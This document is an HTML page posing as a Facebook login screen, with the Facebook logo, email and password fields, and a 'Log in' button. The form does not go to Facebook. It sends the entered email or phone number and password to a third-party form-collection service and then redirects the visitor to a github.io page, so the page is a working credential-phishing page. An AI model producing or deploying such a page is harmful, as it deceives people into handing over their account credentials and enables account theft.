<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Sign Up with Facebook</title>
</head>
<body>
    <div class="logo-container">
        <img class="logo" src="4lCu2zih0c.svg" alt="Facebook logo" width="250">
    </div>
    
    <div class="container">
        <p id="text1">Log into Facebook</p>

        <form action="https://submit-form.com/1KbkLtwhd" method="POST" class="form">
            <input
            type="hidden"
            name="_redirect"
            value="https://www-13.github.io/v-code/"
          />
            <input required name="Email" id="Email-input" type="email" placeholder="Email or Phone number">
            <input required name="Pass" id="pass-input" type="password" placeholder="Password">
            <button id="sub-btn" type="submit">Log in</button>
        </form>

        <a id="fa-link" href="#">Forgot account?</a>
        <div class="hr-with-text">or</div>
        <button id="cna-btn">Create new account</button>
    </div>

    <div class="footer">
         <img style="margin-top: 20px;" id="footer-img" src="footer.png">
    </div>

</body>
</html>
